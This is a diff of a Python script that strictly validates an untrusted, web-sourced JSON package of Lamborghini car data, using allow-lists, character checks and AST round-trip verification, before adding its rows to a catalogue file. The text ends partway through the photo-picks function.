@@ -1,56 +1,58 @@
-"""Validate the Scout's monthly package and turn it into catalogue rows (tools/REFRESH.md, Dev).
+"""Check the Scout's monthly package and turn it into catalogue rows (tools/REFRESH.md, Dev).
 
-The package is untrusted data: it was written by a chat that read the open web. This script never
-opens a URL from it, never runs or evaluates any of it, and writes catalogue rows only as repr() of
-values that passed the checks below. Anything unexpected stops it with the reasons; nothing is
-written unless every check passes.
+The package is untrusted data written by a chat that read the open web (Cyber's spec, 2026-11-11).
+This script never evaluates, executes or imports package text, never opens a URL from it and runs
+no shell. It writes rows only as repr() of values that passed every check, verifies them with the
+AST, then runs `python3 -I` on the edited catalogue. Any violation rejects the whole package.
 
-  python3 tools/scout_import.py check  PKG.json   # validate only; prints what apply would do
-  python3 tools/scout_import.py apply  PKG.json   # validate, then add rows to tools/catalog.py
+  python3 tools/scout_import.py check  PKG.json   # validate only
+  python3 tools/scout_import.py apply  PKG.json   # validate, then write rows to tools/catalog.py
   python3 tools/scout_import.py photos PKG.json   # after your own images.py/flickr.py runs: apply
-                                                  # the Scout's drop/hero picks to data/heroes.json
-  python3 tools/scout_import.py report PKG.json   # Markdown for the PR body (sources as code)
+                                                  # drop/hero picks found in those runs only
+  python3 tools/scout_import.py report PKG.json   # Markdown for the PR body (package text fenced)
+  python3 tools/scout_import.py --self-test       # Cyber's hostile cases a-j on a scratch copy
 
-Package format ("lambo-scout/1"): one JSON object, at most 256 KB, keys exactly as below.
+Package ("version": 1): one UTF-8 JSON object of at most 64 KB, keys exactly as below at every level.
 {
-  "format": "lambo-scout/1",
-  "month": "2026-12",                       # YYYY-MM of the run
-  "window": ["2026-11-01", "2026-12-01"],   # ISO dates searched, from <= to
-  "cars": [                                 # new cars, at most 30
+  "version": 1,
+  "window": ["2026-11-01", "2026-12-01"],          # ISO dates searched, from <= to <= today
+  "cars": [                                          # at most 20
     {"id": "temerario-gt3", "family": "Temerario", "name": "Temerario GT3", "kind": "Race car",
      "year": 2026, "end": 0, "body": "Coupé", "engine": "4.0 L twin-turbo V8", "eng": "V8",
-     "cv": null, "units": null, "designer": "Lamborghini Centro Stile",
-     "cats": ["Lamborghini Temerario GT3"], "wiki": null, "note": "One line.",
-     "perf": null,                           # road cars only: [top km/h, over?, 0-100 s]
-     "after": "temerario",                   # existing id (or earlier id in this package) to follow
-     "sources": ["https://en.wikipedia.org/wiki/..."]}   # 1-6 https links, for the PR only
+     "cv": null, "units": null, "designer": "Lamborghini Centro Stile", "wiki": null,
+     "note": "One line.", "cats": ["Lamborghini Temerario GT3"],
+     "perf": null,                                   # Production/Limited series/One-off only:
+                                                     # [top km/h, over?, 0-100 s or null]
+     "sources": ["https://en.wikipedia.org/wiki/..."]}  # 1-5, hosts in SOURCE_HOSTS; never opened
   ],
-  "fills": [                                # blanks in existing rows, at most 30
-    {"id": "countach-lp400", "field": "units", "value": 152, "sources": ["https://..."]}
-  ],
-  "photos": {"drop": [{"id": "x", "t": "Some photo.jpg"}], "hero": [{"id": "x", "t": "flickr:123"}]},
-  "skipped": [{"name": "Huracán Sterrato EVO", "reason": "teaser only"}]   # at most 30
+  "photos": {"temerario-gt3": {"drop": ["Some photo.jpg", "flickr:123"], "hero": null}},
+  "notes": "One line for the PR: teasers skipped, doubts."
 }
+A car whose id already exists is a blank-fill: every field equals today's row except fields that are
+None today (perf: only if the car has no PERF entry yet). New ids go at the end of CARS. A new family
+is allowed only if its key is also its display name (nothing to add to FAMILY_NAME or FAMILY_WORDS).
 """
-import ast, datetime, json, os, re, sys, unicodedata, urllib.parse
+import ast, datetime, json, os, re, shutil, subprocess, sys, tempfile, unicodedata, urllib.parse
 
 ROOT = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
 CATALOG = os.path.join(ROOT, "tools", "catalog.py")
+HEROES = os.path.join(ROOT, "data", "heroes.json")
 APP = os.path.join(ROOT, "src", "app.js")
-MAX_BYTES = 256 * 1024
+MAX_BYTES = 64 * 1024
+MAX_CARS = 20
 FIELDS = ["id", "family", "name", "kind", "year", "end", "body", "engine", "eng", "cv", "units",
-          "designer", "cats", "wiki", "note"]
-CAR_KEYS = set(FIELDS) | {"perf", "after", "sources"}
-FILL_FIELDS = {"end", "cv", "units", "wiki"}       # only None values in existing rows are filled
-TOP_KEYS = {"format", "month", "window", "cars", "fills", "photos", "skipped"}
-ID_RE = re.compile(r"[a-z0-9]+(?:-[a-z0-9]+){0,7}")
-FAMILY_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9 ]{0,29}")
-PHOTO_RE = re.compile(r"(?!File:)(?!.*://)[^\x00-\x1f\x7f|#<>\[\]{}`\\]{1,200}\.(?i:jpe?g|png|webp|tiff?)|flickr:[0-9]{1,20}")
-# Text fields: letters (any script's accents), digits, spaces and a little punctuation. No markup,
-# quotes that could close anything, backticks, backslashes, control or invisible characters.
-TEXT_PUNCT = set(" .,;:!?'’()/+&-–—°“”%")
-LIMITS = {"name": 60, "body": 30, "engine": 80, "designer": 60, "note": 200, "wiki": 100, "cat": 100,
-          "reason": 120}
+          "designer", "cats", "wiki", "note"]          # E(...) argument order in catalog.py
+CAR_KEYS = set(FIELDS) | {"perf", "sources"}
+TOP_KEYS = {"version", "window", "cars", "photos", "notes"}
+PERF_KINDS = {"Production", "Limited series", "One-off"}
+SOURCE_HOSTS = {"en.wikipedia.org", "www.autocar.co.uk", "www.caranddriver.com", "www.motor1.com",
+                "www.topgear.com", "www.evo.co.uk", "www.carscoops.com"}
+ID_RE = re.compile(r"[a-z0-9-]{2,40}")
+FAMILY_RE = re.compile(r"[A-Za-z0-9 ]{2,30}")
+TEXT_BAD = set("<>{}[]|\\`")
+CAT_BAD = set("<>[]{}|#")
+TEXT_BAD_WORDS = ("__li_", "javascript:", "http")
+INVISIBLE = {*range(0x200B, 0x2010), *range(0x202A, 0x202F), *range(0x2066, 0x206A), 0xFEFF}
 
 
 class Bad(Exception):
@@ -59,363 +61,444 @@ class Bad(Exception):
 
 def read_order(name):
     m = re.search(r"const %s = \[([^\]]*)\]" % name, open(APP, encoding="utf-8").read())
-    return [s for s in re.findall(r"'([^']*)'", m.group(1))]
+    return re.findall(r"'([^']*)'", m.group(1))
 
 
-def text(v, where, limit, empty=False):
-    if not isinstance(v, str):
-        raise Bad(f"{where}: must be a string")
-    if v != v.strip() or (not v and not empty) or len(v) > limit:
-        raise Bad(f"{where}: empty, padded or longer than {limit}")
-    v2 = unicodedata.normalize("NFC", v)
-    if v2 != v:
+def one_line(v, where, limit, bad):
+    if type(v) is not str or not 1 <= len(v) <= limit:
+        raise Bad(f"{where}: must be a string of 1-{limit} characters")
+    if unicodedata.normalize("NFC", v) != v:
         raise Bad(f"{where}: not NFC-normalised")
     for ch in v:
-        if not (ch.isalnum() or ch in TEXT_PUNCT) or unicodedata.category(ch)[0] in "CZ" and ch != " ":
-            raise Bad(f"{where}: character {ch!r} (U+{ord(ch):04X}) not allowed")
-    if "  " in v:
-        raise Bad(f"{where}: double space")
+        cat = unicodedata.category(ch)
+        if ch in bad or cat[0] == "C" or cat in ("Zl", "Zp") or ord(ch) in INVISIBLE:
+            raise Bad(f"{where}: character U+{ord(ch):04X} not allowed")
     return v
+
+
+def text(v, where, limit=200):
+    one_line(v, where, limit, TEXT_BAD)
+    low = v.lower()
+    for w in TEXT_BAD_WORDS:
+        if w in low:
+            raise Bad(f"{where}: may not contain '{w}'")
 
 
 def integer(v, where, lo, hi, none=True):
     if v is None and none:
-        return None
-    if type(v) is not int or not lo <= v <= hi:
+        return
+    if type(v) is not int or not lo <= v <= hi:        # type() is int: rejects True/False and floats
         raise Bad(f"{where}: must be an integer {lo}-{hi}" + (" or null" if none else ""))
-    return v
 
 
-def https_url(v, where):
-    if not isinstance(v, str) or len(v) > 300 or any(ord(c) < 33 or ord(c) > 126 for c in v):
-        raise Bad(f"{where}: must be a printable ASCII URL of at most 300 characters")
+def source(v, where):
+    if type(v) is not str or len(v) > 300 or any(not 33 <= ord(c) <= 126 for c in v) or "`" in v:
+        raise Bad(f"{where}: must be printable ASCII, at most 300 characters")
     u = urllib.parse.urlsplit(v)
-    if u.scheme != "https" or not u.hostname or u.username or u.password or u.port \
-            or not re.fullmatch(r"[a-z0-9.-]+\.[a-z]{2,}", u.hostname) or "`" in v:
-        raise Bad(f"{where}: must be a plain https link")
-    if u.hostname == "lamborghini.com" or u.hostname.endswith(".lamborghini.com"):
-        raise Bad(f"{where}: lamborghini.com is not a source (CLAUDE.md, Photos)")
-    return v
+    try:
+        port = u.port
+    except ValueError:
+        port = "bad"
+    if u.scheme != "https" or "@" in u.netloc or port is not None or u.hostname not in SOURCE_HOSTS:
+        raise Bad(f"{where}: must be https on one of {sorted(SOURCE_HOSTS)}")
 
 
-def no_dupes(pairs):
-    keys = [k for k, _ in pairs]
-    if len(keys) != len(set(keys)):
-        raise Bad(f"duplicate key in package: {sorted(k for k in keys if keys.count(k) > 1)}")
-    return dict(pairs)
-
-
-def strict_keys(obj, allowed, where, required=None):
-    if not isinstance(obj, dict):
+def strict_keys(obj, keys, where):
+    if type(obj) is not dict:
         raise Bad(f"{where}: must be an object")
-    extra = set(obj) - allowed
-    missing = (allowed if required is None else required) - set(obj)
-    if extra or missing:
-        raise Bad(f"{where}: unexpected keys {sorted(extra)}, missing {sorted(missing)}")
-
-
-def listof(v, where, n):
-    if not isinstance(v, list) or len(v) > n:
-        raise Bad(f"{where}: must be a list of at most {n}")
-    return v
+    if set(obj) != keys:
+        raise Bad(f"{where}: unexpected keys {sorted(set(obj) - keys)}, missing {sorted(keys - set(obj))}")
 
 
 def load(path):
     if os.path.getsize(path) > MAX_BYTES:
         raise Bad(f"package larger than {MAX_BYTES} bytes")
-    raw = open(path, "rb").read()
     try:
-        s = raw.decode("utf-8")
+        s = open(path, "rb").read().decode("utf-8")
     except UnicodeDecodeError:
         raise Bad("package is not UTF-8")
 
-    def no_const(c):
-        raise Bad(f"{c} is not JSON")
-    return json.loads(s, object_pairs_hook=no_dupes, parse_constant=no_const)
+    def pairs(kv):
+        keys = [k for k, _ in kv]
+        if len(keys) != len(set(keys)):
+            raise Bad(f"duplicate keys: {sorted({k for k in keys if keys.count(k) > 1})}")
+        return dict(kv)
+
+    def const(c):
+        raise Bad(f"{c} is not allowed")
+
+    def num(x):
+        f = float(x)
+        if f != f or f in (float("inf"), float("-inf")):
+            raise Bad(f"number {x[:20]} is out of range")
+        return f
+    try:
+        return json.loads(s, object_pairs_hook=pairs, parse_constant=const, parse_float=num)
+    except ValueError as e:
+        raise Bad(f"not valid JSON: {e}")
 
 
-def catalog():
-    sys.path.insert(0, os.path.join(ROOT, "tools"))
-    import catalog as cat
-    return cat
+def load_catalog(path=CATALOG):
+    """CARS and PERF read with the AST (literals, plus the module's shorthand string constants), so
+    checking a package runs no code."""
+    tree = ast.parse(open(path, encoding="utf-8").read())
+    names, cars, perf = {}, {}, {}
+    for node in tree.body:
+        if isinstance(node, ast.Assign) and len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
+            n = node.targets[0].id
+            if isinstance(node.value, ast.Constant):
+                names[n] = node.value.value
+            elif n == "PERF":
+                perf = ast.literal_eval(node.value)
+            elif n == "CARS":
+                for call in node.value.elts:
+                    args = [names[a.id] if isinstance(a, ast.Name) else ast.literal_eval(a) for a in call.args]
+                    row = dict(zip(FIELDS, args + [None] * (len(FIELDS) - len(args))))
+                    if not isinstance(row["cats"], list):
+                        row["cats"] = [row["cats"]]
+                    row["note"] = row["note"] or ""
+                    cars[row["id"]] = (row, call)
+    return cars, perf
 
 
-def validate(pkg, applied_ok=False):
-    """Return the package with every value checked; raise Bad listing every problem found.
-    applied_ok: rows and fills already in catalog.py with exactly these values pass (photos, report)."""
-    cat = catalog()
+def validate(pkg, cat_path=CATALOG):
+    cars, perf = load_catalog(cat_path)
     kinds, engs = read_order("KIND_ORDER"), read_order("ENG_ORDER")
-    existing = {c["id"]: c for c in cat.CARS}
-    families = {c["family"] for c in cat.CARS}
-    this_year = datetime.date.today().year
+    today = datetime.date.today()
     errs = []
 
-    def guard(fn, *a):
-        try:
-            return fn(*a)
-        except Bad as e:
-            errs.append(str(e))
-
     strict_keys(pkg, TOP_KEYS, "package")
-    if pkg["format"] != "lambo-scout/1":
-        raise Bad("format must be lambo-scout/1")
-    if not isinstance(pkg["month"], str) or not re.fullmatch(r"20[2-9][0-9]-(0[1-9]|1[0-2])", pkg["month"]):
-        errs.append("month: must be YYYY-MM")
+    if type(pkg["version"]) is not int or pkg["version"] != 1:
+        raise Bad("version must be 1")
     w = pkg["window"]
     try:
-        a, b = (datetime.date.fromisoformat(d) for d in w) if isinstance(w, list) and len(w) == 2 \
-            and all(isinstance(d, str) and len(d) == 10 for d in w) else (None, None)
-        if not a or a > b or b > datetime.date.today() + datetime.timedelta(days=1):
+        if type(w) is not list or len(w) != 2 or not all(type(d) is str and len(d) == 10 for d in w):
             raise ValueError
-    except (ValueError, TypeError):
-        errs.append("window: must be two ISO dates, from <= to <= today")
+        a, b = map(datetime.date.fromisoformat, w)
+        if a > b or b > today:
+            raise ValueError
+    except ValueError:
+        errs.append("window: two ISO dates, from <= to <= today")
+    if pkg["notes"] != "":
+        try:
+            text(pkg["notes"], "notes", 300)
+        except Bad as e:
+            errs.append(str(e))
+    if type(pkg["cars"]) is not list or len(pkg["cars"]) > MAX_CARS:
+        raise Bad(f"cars: a list of at most {MAX_CARS}")
 
-    new_ids = []
-    for i, c in enumerate(listof(pkg["cars"], "cars", 30)):
+    seen = set()
+    for i, c in enumerate(pkg["cars"]):
         where = f"cars[{i}]"
         try:
             strict_keys(c, CAR_KEYS, where)
-            if not isinstance(c["id"], str) or not ID_RE.fullmatch(c["id"]) or len(c["id"]) > 40:
-                raise Bad(f"{where}.id: lowercase words joined by '-', at most 40 characters")
-            where = f"car {c['id']}"
-            done = applied_ok and c["id"] in existing and \
-                existing[c["id"]] == {f: c.get(f) for f in FIELDS}
-            if (c["id"] in existing and not done) or c["id"] in new_ids:
-                raise Bad(f"{where}: id already used")
-        except Bad as e:
-            errs.append(str(e))
+            if type(c["id"]) is not str or not ID_RE.fullmatch(c["id"]):
+                raise Bad(f"{where}.id: must match ^[a-z0-9-]{{2,40}}$")
+            if c["id"] in seen:
+                raise Bad(f"{where}.id: twice in the package")
+        except Bad as x:
+            errs.append(str(x))
             continue
-        if not isinstance(c["family"], str) or not FAMILY_RE.fullmatch(c["family"]):
-            errs.append(f"{where}.family: ASCII letters, digits and spaces, at most 30")
-        elif c["family"] not in families:
-            errs.append(f"{where}.family: '{c['family']}' is a new family; add it by hand (CLAUDE.md, "
-                        "Rules: FAMILY_NAME, FAMILY_WORDS) and leave it out of the package")
-        for f in ("name", "body", "engine", "designer", "note"):
-            guard(text, c[f], f"{where}.{f}", LIMITS[f])
+        seen.add(c["id"])
+        where = f"car {c['id']}"
+        e = []
+
+        def chk(fn, *a):
+            try:
+                fn(*a)
+            except Bad as x:
+                e.append(str(x))
+        if type(c["family"]) is not str or not FAMILY_RE.fullmatch(c["family"]):
+            e.append(f"{where}.family: must match ^[A-Za-z0-9 ]{{2,30}}$")
         if c["kind"] not in kinds:
-            errs.append(f"{where}.kind: one of {kinds}")
+            e.append(f"{where}.kind: one of {kinds}")
         if c["eng"] not in engs:
-            errs.append(f"{where}.eng: one of {engs}")
-        guard(integer, c["year"], f"{where}.year", 1963, this_year + 1, False)
-        if c["end"] is not None and c["end"] != 0:
-            guard(integer, c["end"], f"{where}.end", c["year"] if type(c["year"]) is int else 1963, this_year)
-        guard(integer, c["cv"], f"{where}.cv", 50, 2500)
-        guard(integer, c["units"], f"{where}.units", 1, 100000)
-        if c["wiki"] is not None:
-            guard(text, c["wiki"], f"{where}.wiki", LIMITS["wiki"])
+            e.append(f"{where}.eng: one of {engs}")
+        chk(integer, c["year"], f"{where}.year", 1963, today.year + 1, False)
+        if type(c["end"]) is not int or c["end"] != 0:
+            chk(integer, c["end"], f"{where}.end", c["year"] if type(c["year"]) is int else 1963, today.year + 1)
+        chk(integer, c["cv"], f"{where}.cv", 50, 2500)
+        chk(integer, c["units"], f"{where}.units", 1, 100000)
+        for f in ("name", "body", "engine", "note"):
+            chk(text, c[f], f"{where}.{f}")
+        for f in ("designer", "wiki"):
+            if c[f] is not None:
+                chk(text, c[f], f"{where}.{f}")
         cats = c["cats"]
-        if not isinstance(cats, list) or not 1 <= len(cats) <= 4 or len(set(map(str, cats))) != len(cats):
-            errs.append(f"{where}.cats: 1-4 distinct Commons category names")
+        if type(cats) is not list or not 1 <= len(cats) <= 3:
+            e.append(f"{where}.cats: 1-3 Commons category names")
         else:
             for j, k in enumerate(cats):
-                guard(text, k, f"{where}.cats[{j}]", LIMITS["cat"])
-                if isinstance(k, str) and not k.startswith("Lamborghini "):
-                    errs.append(f"{where}.cats[{j}]: must start with 'Lamborghini '")
+                chk(one_line, k, f"{where}.cats[{j}]", 150, CAT_BAD)
         p = c["perf"]
         if p is not None:
-            if c["kind"] in ("Race car", "Concept", "Prototype"):
-                errs.append(f"{where}.perf: road cars only")
-            elif not (isinstance(p, list) and len(p) == 3 and type(p[0]) is int and 150 <= p[0] <= 500
-                      and type(p[1]) is bool and type(p[2]) in (int, float) and 1.5 <= p[2] <= 20
-                      and round(p[2], 1) == p[2]):
-                errs.append(f"{where}.perf: [top km/h 150-500, over true/false, 0-100 s 1.5-20, one decimal]")
-        if c["after"] not in existing and c["after"] not in new_ids:
-            errs.append(f"{where}.after: must be an id in the catalogue or earlier in this package")
+            if not (type(p) is list and len(p) == 3 and type(p[0]) is int and 150 <= p[0] <= 500
+                    and type(p[1]) is bool and (p[2] is None or (type(p[2]) in (int, float) and 1.5 <= p[2] <= 15))):
+                e.append(f"{where}.perf: [top km/h 150-500, over true/false, 0-100 s 1.5-15 or null]")
+            if c["kind"] not in PERF_KINDS:
+                e.append(f"{where}.perf: only for {sorted(PERF_KINDS)}")
         src = c["sources"]
-        if not isinstance(src, list) or not 1 <= len(src) <= 6:
-            errs.append(f"{where}.sources: 1-6 links")
+        if type(src) is not list or not 1 <= len(src) <= 5:
+            e.append(f"{where}.sources: 1-5 links")
         else:
             for j, u in enumerate(src):
-                guard(https_url, u, f"{where}.sources[{j}]")
-        new_ids.append(c["id"])
-
-    seen = set()
-    for i, f in enumerate(listof(pkg["fills"], "fills", 30)):
-        where = f"fills[{i}]"
-        try:
-            strict_keys(f, {"id", "field", "value", "sources"}, where)
-            if f["id"] not in existing or f["field"] not in FILL_FIELDS:
-                raise Bad(f"{where}: id must exist and field be one of {sorted(FILL_FIELDS)}")
-            if (f["id"], f["field"]) in seen:
-                raise Bad(f"{where}: filled twice")
-            seen.add((f["id"], f["field"]))
-            car = existing[f["id"]]
-            if car[f["field"]] is not None and not (applied_ok and car[f["field"]] == f["value"]):
-                raise Bad(f"{where}: {f['id']}.{f['field']} is not blank; a change needs a Dev's own check")
-            v, fld = f["value"], f["field"]
-            if fld == "end":
-                if v != 0:
-                    integer(v, where + ".value", car["year"], this_year, False)
-            elif fld == "cv":
-                integer(v, where + ".value", 50, 2500, False)
-            elif fld == "units":
-                integer(v, where + ".value", 1, 100000, False)
-            else:
-                text(v, where + ".value", LIMITS["wiki"])
-            if not isinstance(f["sources"], list) or not 2 <= len(f["sources"]) <= 6:
-                raise Bad(f"{where}.sources: 2-6 links (blank beats wrong: two sources must agree)")
-            for j, u in enumerate(f["sources"]):
-                https_url(u, f"{where}.sources[{j}]")
-        except Bad as e:
-            errs.append(str(e))
+                chk(source, u, f"{where}.sources[{j}]")
+        if c["id"] in cars and not e:          # blank-fill of an existing row
+            old = cars[c["id"]][0]
+            changed = [f for f in FIELDS if c[f] != old[f]]
+            for f in changed:
+                if old[f] is not None:
+                    e.append(f"{where}.{f}: differs from today's row, which is not blank there")
+                elif c[f] is None:
+                    pass
+            new_perf = p is not None and c["id"] not in perf
+            if p is not None and c["id"] in perf and perf_value(p) != perf[c["id"]]:
+                e.append(f"{where}.perf: the car already has figures")
+            if not changed and not new_perf and not e:
+                e.append(f"{where}: an existing car with nothing to fill")
+        errs.extend(e)
 
     ph = pkg["photos"]
-    try:
-        strict_keys(ph, {"drop", "hero"}, "photos")
-        heroes = set()
-        for kind in ("drop", "hero"):
-            for i, x in enumerate(listof(ph[kind], f"photos.{kind}", 200)):
-                where = f"photos.{kind}[{i}]"
-                strict_keys(x, {"id", "t"}, where)
-                if x["id"] not in existing and x["id"] not in new_ids:
-                    raise Bad(f"{where}.id: unknown car")
-                if not isinstance(x["t"], str) or not PHOTO_RE.fullmatch(x["t"]):
-                    raise Bad(f"{where}.t: a Commons file title without 'File:' (as in heroes.json) or 'flickr:<number>'")
-                if kind == "hero":
-                    if x["id"] in heroes:
-                        raise Bad(f"{where}: second hero for {x['id']}")
-                    heroes.add(x["id"])
-    except Bad as e:
-        errs.append(str(e))
-
-    for i, s in enumerate(listof(pkg["skipped"], "skipped", 30)):
-        try:
-            strict_keys(s, {"name", "reason"}, f"skipped[{i}]")
-            text(s["name"], f"skipped[{i}].name", LIMITS["name"])
-            text(s["reason"], f"skipped[{i}].reason", LIMITS["reason"])
-        except Bad as e:
-            errs.append(str(e))
+    if type(ph) is not dict:
+        errs.append("photos: must be an object")
+    else:
+        for cid, v in ph.items():
+            where = f"photos.{cid}"
+            try:
+                if cid not in cars and cid not in seen:
+                    raise Bad(f"{where}: unknown car id")
+                strict_keys(v, {"drop", "hero"}, where)
+                if type(v["drop"]) is not list or len(v["drop"]) > 20:
+                    raise Bad(f"{where}.drop: a list of at most 20 titles")
+                for j, t in enumerate(v["drop"] + ([v["hero"]] if v["hero"] is not None else [])):
+                    one_line(t, f"{where} title {j}", 200, TEXT_BAD)
+            except Bad as x:
+                errs.append(str(x))
     if errs:
         raise Bad("\n".join(errs))
     return pkg
 
 
+def perf_value(p):
+    return (p[0], p[1], None if p[2] is None else float(p[2]))
+
+
 def row_source(c):
-    args = ", ".join(repr(c[f]) for f in FIELDS[:12])
-    tail = ", ".join(repr(c[f]) for f in FIELDS[12:])
-    return f"    E({args},\n      {tail}),\n"
+    return (f"    E({', '.join(repr(c[f]) for f in FIELDS[:12])},\n"
+            f"      {', '.join(repr(c[f]) for f in FIELDS[12:])}),\n")
 
 
-def calls(src):
-    """id -> ast.Call of every E(...) row in catalog.py."""
-    out = {}
-    for node in ast.walk(ast.parse(src)):
-        if isinstance(node, ast.Call) and getattr(node.func, "id", None) == "E":
-            out[ast.literal_eval(node.args[0])] = node
-    return out
-
-
-def offset(lines, lineno, col):
-    return sum(len(l) for l in lines[:lineno - 1]) + len(lines[lineno - 1].encode("utf-8")[:col].decode("utf-8"))
-
-
-def apply(pkg):
-    src = open(CATALOG, encoding="utf-8").read()
-    # Fills first, from the end of the file backwards so earlier offsets stay valid.
+def apply(pkg, cat_path=CATALOG):
+    src = open(cat_path, encoding="utf-8").read()
+    cars, perf = load_catalog(cat_path)
     lines = src.splitlines(keepends=True)
-    rows = calls(src)
-    edits = []
-    for f in pkg["fills"]:
-        node = rows[f["id"]].args[FIELDS.index(f["field"])] if FIELDS.index(f["field"]) < len(rows[f["id"]].args) else None
-        if not (isinstance(node, ast.Constant) and node.value is None):
-            raise Bad(f"fill {f['id']}.{f['field']}: the row does not hold a literal None there; do it by hand")
-        a = offset(lines, node.lineno, node.col_offset)
-        b = offset(lines, node.end_lineno, node.end_col_offset)
-        edits.append((a, b, repr(f["value"])))
-    for a, b, new in sorted(edits, reverse=True):
+    starts = [0]
+    for l in lines:
+        starts.append(starts[-1] + len(l))
+
+    def pos(lineno, col):          # ast columns are UTF-8 byte offsets
+        return starts[lineno - 1] + len(lines[lineno - 1].encode("utf-8")[:col].decode("utf-8"))
+    tree = ast.parse(src)
+    top = {n.targets[0].id: n.value for n in tree.body
+           if isinstance(n, ast.Assign) and isinstance(n.targets[0], ast.Name)}
+    edits, new_rows, new_perf = [], "", ""
+    for c in pkg["cars"]:
+        if c["id"] in cars:
+            old, call = cars[c["id"]]
+            for k, f in enumerate(FIELDS):
+                if c[f] == old[f]:
+                    continue
+                node = call.args[k] if k < len(call.args) else None
+                if not (isinstance(node, ast.Constant) and node.value is None):
+                    raise Bad(f"{c['id']}.{f}: no literal None to fill in catalog.py; do it by hand")
+                edits.append((pos(node.lineno, node.col_offset), pos(node.end_lineno, node.end_col_offset), repr(c[f])))
+        else:
+            new_rows += row_source(c)
+        if c["perf"] is not None and c["id"] not in perf:
+            new_perf += f"    {c['id']!r}: {perf_value(c['perf'])!r},\n"
+    for node, add in ((top["CARS"], new_rows), (top["PERF"], new_perf)):
+        if add:   # just before the closing bracket's line
+            close = pos(node.end_lineno, node.end_col_offset) - 1
+            at = src.rindex("\n", 0, close) + 1
+            edits.append((at, at, add))
+    for a, b, new in sorted(edits, key=lambda x: x[0], reverse=True):
         src = src[:a] + new + src[b:]
-    # New rows: each after the row named in "after" (or after the row inserted for it).
-    for c in pkg["cars"]:
-        lines = src.splitlines(keepends=True)
-        node = calls(src)[c["after"]]
-        at = offset(lines, node.end_lineno, node.end_col_offset)
-        at = src.index("\n", at) + 1          # after the row's trailing comma and newline
-        src = src[:at] + row_source(c) + src[at:]
-    perf = [c for c in pkg["cars"] if c["perf"] is not None]
-    if perf:
-        m = re.search(r"\nPERF = \{\n(?:.*\n)*?\}\n", src)
-        end = m.end() - 2
-        add = "".join(f"    {c['id']!r}: ({c['perf'][0]!r}, {c['perf'][1]!r}, {float(c['perf'][2])!r}),\n"
-                      for c in perf)
-        src = src[:end] + add + src[end:]
-    # Round trip: the edited file must parse and give back exactly the package's values.
-    ns = {}
-    exec(compile(src, CATALOG, "exec"), ns)   # our own file, edited only with repr() of checked values
-    got = {c["id"]: c for c in ns["CARS"]}
-    for c in pkg["cars"]:
-        want = {f: c[f] for f in FIELDS}
-        if got.get(c["id"]) != want:
-            raise Bad(f"round trip failed for {c['id']}; catalog.py left unchanged")
-        if c["perf"] is not None and ns["PERF"][c["id"]] != (c["perf"][0], c["perf"][1], float(c["perf"][2])):
-            raise Bad(f"round trip failed for PERF {c['id']}; catalog.py left unchanged")
-    for f in pkg["fills"]:
-        if got[f["id"]][f["field"]] != f["value"]:
-            raise Bad(f"round trip failed for fill {f['id']}.{f['field']}; catalog.py left unchanged")
-    with open(CATALOG, "w", encoding="utf-8", newline="\n") as fh:
-        fh.write(src)
-    print(f"catalog.py: {len(pkg['cars'])} rows added, {len(perf)} PERF entries, {len(pkg['fills'])} blanks filled")
-    print("next: python3 tools/images.py --only " + ",".join(c["id"] for c in pkg["cars"]) if pkg["cars"] else "")
+    tmpd = tempfile.mkdtemp()
+    tmp = os.path.join(tmpd, "catalog.py")
+    try:
+        with open(tmp, "w", encoding="utf-8", newline="\n") as fh:
+            fh.write(src)
+        # Verify with the AST before writing: every package value is back, and only as a literal.
+        got, gperf = load_catalog(tmp)
+        if set(got) != set(cars) | {c["id"] for c in pkg["cars"]}:
+            raise Bad("unexpected rows after the edit")
+        before = sum(isinstance(n, (ast.Import, ast.ImportFrom, ast.FunctionDef)) for n in ast.walk(tree))
+        after = sum(isinstance(n, (ast.Import, ast.ImportFrom, ast.FunctionDef)) for n in ast.walk(ast.parse(src)))
+        if before != after:
+            raise Bad("the edit added code")
+        for c in pkg["cars"]:
+            row, call = got[c["id"]]
+            if c["id"] not in cars and not all(isinstance(a, (ast.Constant, ast.List)) for a in call.args):
+                raise Bad(f"{c['id']}: written row is not all literals")
+            if row != {f: c[f] for f in FIELDS}:
+                raise Bad(f"{c['id']}: round trip failed")
+            if c["perf"] is not None and c["id"] not in perf and gperf.get(c["id"]) != perf_value(c["perf"]):
+                raise Bad(f"{c['id']}: PERF round trip failed")
+        r = subprocess.run([sys.executable, "-I", tmp], capture_output=True, text=True, timeout=60)
+        if r.returncode:
+            raise Bad("python3 -I catalog.py failed:\n" + r.stderr[-2000:])
+        shutil.copyfile(tmp, cat_path)
+    finally:
+        shutil.rmtree(tmpd)
+    new = [c["id"] for c in pkg["cars"] if c["id"] not in cars]
+    print(f"catalog.py: {len(new)} rows added, {len(pkg['cars']) - len(new)} rows filled, "
+          f"{new_perf.count(chr(10))} PERF entries")
+    if new:
+        print("next: python3 tools/images.py --only " + ",".join(new))
 
 
-def photos(pkg):
-    """Apply drop/hero picks, but only for photos the Dev's own runs put in images.json/flickr.json."""
+def own_photos():
     own = {}
     for name in ("images.json", "flickr.json"):
         p = os.path.join(ROOT, "data", name)
         if os.path.exists(p):
             for cid, entry in json.load(open(p, encoding="utf-8")).items():
                 own.setdefault(cid, set()).update(x["t"] for x in entry.get("images", []))
-    hp = os.path.join(ROOT, "data", "heroes.json")
-    h = json.load(open(hp, encoding="utf-8"))
-    skipped = []
-    for x in pkg["photos"]["drop"]:
-        if x["t"] not in own.get(x["id"], ()):
-            skipped.append(f"drop {x['id']} {x['t']}: not among this car's photos")
-        elif x["t"] not in h["drop"].setdefault(x["id"], []):
-            h["drop"][x["id"]].append(x["t"])
-    for x in pkg["photos"]["hero"]:
-        if x["t"] not in own.get(x["id"], ()) or x["t"] in h["drop"].get(x["id"], []):
-            skipped.append(f"hero {x['id']} {x['t']}: not among this car's kept photos")
-        else:
-            h["hero"][x["id"]] = x["t"]
-    with open(hp, "w", encoding="utf-8", newline="\n") as fh:
+    return own
+
+
+def photos(pkg, own=None, heroes_path=HEROES):
+    """Apply drop/hero picks only for photos the Dev's own runs put in images.json/flickr.json."""
+    own = own_photos() if own is None else own
+    h = json.load(open(heroes_path, encoding="utf-8"))
+    ignored = []
+    for cid, v in pkg["photos"].items():
+        mine = own.get(cid, set())
+        for t in v["drop"]:
+            if t not in mine:
+                ignored.append(f"drop {cid}: {t!r} is not in your own run")
+            elif t not in h["drop"].get(cid, []):
